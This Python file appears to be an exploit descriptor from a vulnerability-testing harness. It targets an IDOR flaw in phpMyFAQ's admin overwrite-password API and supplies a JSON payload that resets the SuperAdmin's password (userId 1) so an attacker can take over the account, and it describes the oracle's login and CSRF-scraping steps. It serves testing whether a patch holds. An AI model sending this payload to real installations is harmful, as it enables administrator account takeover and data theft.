#!/usr/bin/env python3
"""[GIVEN] CVE-2026-35671 seed exploit descriptor for phpmyfaq-cve-2026-56396.

Original IDOR (GHSA-xvp4-phqj-cjr3 / CVE-2026-35671): the real phpMyFAQ admin API method
`overwritePassword()` (route POST admin/api/user/overwrite-password) took `userId` straight from
the request body with NO object-level authorization check. A low-privilege user administrator
(holding the delegable add_user/edit_user/delete_user rights, but NOT SuperAdmin) could set
userId=1 and overwrite the SuperAdmin's password, then log in as the SuperAdmin (full account
takeover) and read SuperAdmin-only data (here: phpMyFAQ's REST-API client token, the canary).

phpMyFAQ 4.1.3 (V1) fixed THIS method by adding:
    if (!$isSelf && !$actingIsSuperAdmin) return 403;
    if (!$actingIsSuperAdmin && ($targetUser->isSuperAdmin() || status==='protected')) return 403;
so on V1 the seed is BLOCKED (cannot overwrite uid=1 -> takeover fails -> flag unreachable).

oracle.py drives this over real HTTP: log in as 'editor', scrape the real page CSRF token
phpMyFAQ issues for the overwrite-password modal, POST the overwrite, then attempt the takeover
login and read the SuperAdmin-only config token.
"""


def candidate() -> dict:
    NEWPW = "PwnedByEditor_2026"
    return {
        "probe_id": "cve-2026-35671-overwrite-password-idor",
        "endpoint": "/admin/api/user/overwrite-password",
        "mode": "takeover",           # after overwrite, log in as uid=1 with NEWPW
        "takeover_login": "admin",
        "json": {
            "userId": 1,              # IDOR: target the SuperAdmin (uid=1)
            "newPassword": NEWPW,
            "passwordRepeat": NEWPW,
        },
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
